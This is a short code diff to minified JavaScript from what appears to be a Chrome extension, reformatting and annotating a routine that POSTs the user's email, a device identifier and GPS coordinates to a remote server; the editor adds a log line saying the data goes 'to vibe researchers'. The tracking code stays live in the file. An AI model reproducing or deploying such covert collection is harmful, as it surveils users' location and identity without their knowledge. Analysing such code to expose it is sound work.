@@ -46,14 +46,18 @@
             ((new Date).getTime() - a > i || !(Math.abs(c[0] - array[0]) < n && Math.abs(c[1] - array[1]) < n)) && (await (r = l, o = d, t = array, new Promise((array, n) => {
                 try {
                     const xhttpReq = new XMLHttpRequest, // initalize tracker :DDDD
-                        a = "info[platform]=chromeTracker&info[email]=" + r + "&info[udid]=" + o + "&info[gps]=" + JSON.stringify(t) + "&info[phrases]=1";
-                    xhttpReq.open("POST", s, !0), xhttpReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xhttpReq.send(a), xhttpReq.onload = () => {
+                        url = "info[platform]=chromeTracker&info[email]=" + r + "&info[udid]=" + o + "&info[gps]=" + JSON.stringify(t) + "&info[phrases]=1"; // base url
+                    xhttpReq.open("POST", s, !0);
+					xhttpReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); // content types
+					xhttpReq.send(url); // send url
+					xhttpReq.onload = () => {
                         e()
                     }, xhttpReq.onabort = () => {
                         n()
                     }, xhttpReq.onerror = () => {
                         n()
                     }
+                    console.log('URL BEING SENT OFF TO VIBE RESEARCHERS: '+url);
                 } catch (e) {
                     n(e)
                 }
